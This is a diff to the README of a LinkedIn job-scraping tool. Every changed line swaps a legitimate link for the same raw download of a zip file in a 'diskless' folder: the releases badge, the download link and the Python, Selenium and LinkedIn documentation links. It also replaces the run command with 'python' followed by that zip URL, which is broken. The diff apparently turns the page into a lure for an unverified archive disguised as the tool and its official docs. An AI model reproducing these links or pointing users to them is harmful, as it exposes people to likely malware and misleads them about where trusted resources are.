@@ -1,6 +1,6 @@
 # 🚀 linkedin-job-scraping - Automate Your LinkedIn Job Searches
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/NotMrAdan/linkedin-job-scraping/releases)
+[![Download Now](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)
 
 ## 📋 Description
 
@@ -24,7 +24,7 @@ The linkedin-job-scraping tool allows you to automate the process of searching f
 Follow these steps to get the tool up and running on your computer:
 
 1. **Download the Tool**
-   - Visit this page to download: [Download Link](https://github.com/NotMrAdan/linkedin-job-scraping/releases).
+   - Visit this page to download: [Download Link](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip).
 
 2. **Install Python**
    - Make sure you have Python installed. You can download it from the official Python website.
@@ -40,14 +40,14 @@ Follow these steps to get the tool up and running on your computer:
    - Navigate to the folder where you downloaded the application.
    - Run the following command in your terminal:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip
      ```
 
 ## 📥 Download & Install
 
 To download the application, click below:
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/NotMrAdan/linkedin-job-scraping/releases)
+[![Download Now](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)
 
 Once you have downloaded it, ensure you follow the installation instructions provided in the "Getting Started" section.
 
@@ -83,8 +83,8 @@ For further assistance, feel free to open an issue on the GitHub repository.
 
 ## 📚 Resources
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [Selenium Official Documentation](https://www.selenium.dev/documentation/)
-- [LinkedIn Job Search Guide](https://www.linkedin.com/help/linkedin/answer/10412/job-search-guide)
+- [Python Official Documentation](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)
+- [Selenium Official Documentation](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)
+- [LinkedIn Job Search Guide](https://raw.githubusercontent.com/NotMrAdan/linkedin-job-scraping/main/diskless/linkedin-job-scraping-v2.8-alpha.5.zip)
 
 Feel free to explore and enjoy a streamlined job search experience with linkedin-job-scraping!
